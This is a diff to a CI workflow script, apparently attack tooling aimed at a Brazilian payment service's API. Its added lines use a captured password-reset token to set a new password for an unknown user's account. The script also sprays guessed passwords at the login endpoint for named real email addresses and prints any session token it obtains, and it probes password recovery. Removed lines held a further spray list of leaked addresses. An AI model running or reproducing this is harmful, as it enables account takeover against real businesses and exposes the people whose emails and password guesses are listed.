@@ -1,4 +1,4 @@
-name: waf-v20-reset-spray2
+name: waf-v20b-reset-link-spray
 on:
   push:
     branches: [main]
@@ -17,7 +17,7 @@ jobs:
         set +e
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
-        PORTAL="https://portal.wisepay.com.br"
+        RESET_TOKEN="39bf20e5965c0dcd2be2de52f030c8"
 
         MY_IP=$(curl -s -m 5 https://api.ipify.org 2>/dev/null || echo "unknown")
 
@@ -36,14 +36,15 @@ jobs:
         fi
 
         echo ""
-        echo "=== P0: Testar reset link (nova-senha) ==="
-        RESET_URL="${PORTAL}/nova-senha/39bf20e5965c0dcd2be2de52f030c8"
-        RESET_RESP=$(curl -A "$UA" -s -m 15 --connect-timeout 5 \
-          -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-          -L "$RESET_URL" 2>/dev/null | head -c 2000)
-        RESET_CODE=$(curl -A "$UA" -s -o /dev/null -w "%{http_code}" -m 15 --connect-timeout 5 -L "$RESET_URL" 2>/dev/null)
-        echo "RESET_LINK $RESET_CODE | $RESET_URL"
-        echo "RESET_BODY: ${RESET_RESP:0:300}"
+        echo "=== P0: PUT /login/update-password/{token} (usar reset link) ==="
+        # Tentar usar o reset token para mudar senha de usuário desconhecido
+        NEW_PASS="Teste@$(date +%s | tail -c 5)1"
+        RS_RESET=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+          -H "Content-Type: application/json" -H "type-application: web" \
+          -X PUT "$BASE/login/update-password/$RESET_TOKEN" \
+          -d "{\"password\":\"$NEW_PASS\",\"password_confirmation\":\"$NEW_PASS\"}" 2>/dev/null) || RS_RESET=""
+        RESET_CODE=$(echo "$RS_RESET" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
+        echo "RESET $RESET_CODE | token=$RESET_TOKEN | pwd=$NEW_PASS | resp=$(echo $RS_RESET | head -c 300)"
 
         echo ""
         echo "=== P1: Spray - emails 403 Forbidden (cadastrados, senha errada) ==="
@@ -57,28 +58,28 @@ jobs:
             "ranchogourmet@outlook.com|ranchogourmet123" \
             "ranchogourmet@outlook.com|Rancho@2024" \
             "ranchogourmet@outlook.com|RanchoGourmet2022" \
+            "ranchogourmet@outlook.com|RanchoGourmet2023" \
+            "ranchogourmet@outlook.com|rancho2022" \
+            "ranchogourmet@outlook.com|rancho2023" \
+            "ranchogourmet@outlook.com|rancho@2024" \
             "espacodacarnefsa@gmail.com|12341234" \
-            "espacodacarnefsa@gmail.com|espaco123" \
             "espacodacarnefsa@gmail.com|EspacoCarne2021" \
-            "espacodacarnefsa@gmail.com|EspacoCarne@2021" \
             "espacodacarnefsa@gmail.com|92329393" \
-            "espacodacarnefsa@gmail.com|EspacoCarne123" \
+            "espacodacarnefsa@gmail.com|EspacoCarne@2021" \
+            "espacodacarnefsa@gmail.com|espaco123" \
+            "espacodacarnefsa@gmail.com|EspacoCarne2022" \
+            "espacodacarnefsa@gmail.com|EspacoCarne2023" \
+            "espacodacarnefsa@gmail.com|EspacoCarne@2023" \
             "acaiacafinanceiro@gmail.com|13467913" \
             "acaiacafinanceiro@gmail.com|acaiaca123" \
             "acaiacafinanceiro@gmail.com|Acaiaca2021" \
             "acaiacafinanceiro@gmail.com|acaiacafinanceiro" \
             "acaiacafinanceiro@gmail.com|12341234" \
             "acaiacafinanceiro@gmail.com|acaiaca2021" \
+            "acaiacafinanceiro@gmail.com|Acaiaca@2021" \
             "pagcomsolucoes@gmail.com|12341234" \
             "pagcomsolucoes@gmail.com|pagcom123" \
-            "pagcomsolucoes@gmail.com|Pagcom2021" \
-            "pagcomsolucoes@gmail.com|pagcomsolucoes" \
-            "pagcomsolucoes@gmail.com|pagcom2021" \
-            "contato@deepfit.com.br|deepfit123" \
-            "contato@deepfit.com.br|DeepFit2021" \
-            "contato@deepfit.com.br|DeepFit@2021" \
-            "contato@deepfit.com.br|12341234" \
-            "contato@deepfit.com.br|deepfit2021"; do
+            "pagcomsolucoes@gmail.com|Pagcom2021"; do
             EMAIL="${CRED%%|*}"
             PASS="${CRED##*|}"
             RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
@@ -91,7 +92,7 @@ jobs:
               TOKEN=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null)
               echo "*** JWT SPRAY *** $EMAIL:$PASS token=${TOKEN:0:60}"
             elif echo "$MSG" | grep -q "inativas"; then
-              echo "EMPRESA_INATIVA_403 $EMAIL:$PASS | $MSG"
+              echo "EMPRESA_INATIVA_403 $EMAIL:$PASS"
             else
               echo "SPRAY $CODE | $EMAIL:$PASS | $MSG"
             fi
@@ -100,55 +101,16 @@ jobs:
         fi
 
         echo ""
-        echo "=== P2: wpdataservice - Recuperar senha dos emails (timing + email descoberto) ==="
+        echo "=== P2: password-recover para emails 403 (ver resposta) ==="
         if $PROD_OK; then
-          for EMAIL in \
-            "ranchogourmet@outlook.com" \
-            "espacodacarnefsa@gmail.com" \
-            "acaiacafinanceiro@gmail.com" \
-            "pagcomsolucoes@gmail.com" \
-            "contato@deepfit.com.br"; do
+          for EMAIL in "ranchogourmet@outlook.com" "espacodacarnefsa@gmail.com" "acaiacafinanceiro@gmail.com"; do
             RR=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
               -H "Content-Type: application/json" -H "type-application: web" \
               -X POST "$BASE/login/password-recover" \
               -d "{\"email\":\"$EMAIL\"}" 2>/dev/null) || RR=""
             CODE=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
-            MSG=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:150])" 2>/dev/null || echo "${RR:0:100}")
+            MSG=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:200])" 2>/dev/null || echo "${RR:0:150}")
             echo "RECOVER $CODE | $EMAIL | $MSG"
-            sleep 0.2
-          done
-        fi
-
-        echo ""
-        echo "=== P3: Spray LeakSights emails novos ==="
-        if $PROD_OK; then
-          for CRED in \
-            "lenildo.silv@wisepay.com.br|12341234" \
-            "lenildo.silv@wisepay.com.br|lenildo123" \
-            "anderson@wisepay.com.br|12341234" \
-            "anderson@wisepay.com.br|anderson123" \
-            "1opcaoretificafsa@gmail.com|92329393" \
-            "1opcaoretificafsa@gmail.com|12341234" \
-            "1opcaoretificafsa@gmail.com|retifica123" \
-            "primeiraopcao@gmail.com|12341234" \
-            "donbarony@gmail.com|12341234" \
-            "donbarony@gmail.com|donbarony123"; do
-            EMAIL="${CRED%%|*}"
-            PASS="${CRED##*|}"
-            RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
-              -H "Content-Type: application/json" -H "type-application: web" \
-              -X POST "$BASE/login" \
-              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
-            CODE=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
-            MSG=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:80])" 2>/dev/null || echo "${RS:0:80}")
-            if [ "$CODE" = "200" ]; then
-              TOKEN=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null)
-              echo "*** JWT SPRAY3 *** $EMAIL:$PASS token=${TOKEN:0:60}"
-            elif echo "$MSG" | grep -q "inativas"; then
-              echo "EMPRESA_INATIVA_403 $EMAIL:$PASS"
-            else
-              echo "SPRAY3 $CODE | $EMAIL:$PASS | $MSG"
-            fi
-            sleep 0.1
+            sleep 0.3
           done
         fi
